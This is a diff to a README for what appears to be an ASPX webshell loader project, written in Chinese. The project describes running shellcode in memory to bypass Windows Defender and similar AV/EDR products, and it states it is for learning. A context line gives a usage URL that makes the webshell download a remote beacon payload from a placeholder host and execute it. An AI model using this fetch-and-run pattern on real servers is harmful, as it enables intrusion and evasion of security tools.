@@ -4,9 +4,11 @@
 
 
 
-ASPX内存执行shellcode
+- ASPX内存执行shellcode,绕过Windows Defender（AV/EDR）
 
-这只是个代码例子，目的是为了学习
+
+- 这只是个代码例子，目的是为了学习
+
 
 
 
@@ -22,6 +24,7 @@ http://URLA/bypass.aspx?shellcodeURL=http://URLB/beacon_x64.bin
 
 视频
 
-![](https://github.com/INotGreen/Webshell-loader/blob/main/video/demo.mp4)
 
-![演示视频](https://github.com/INotGreen/Webshell-loader/blob/main/video/demo.mp4)
+
+<video src = "https://github.com/INotGreen/Webshell-loader/issues/1#issuecomment-1855244052"><video>
+
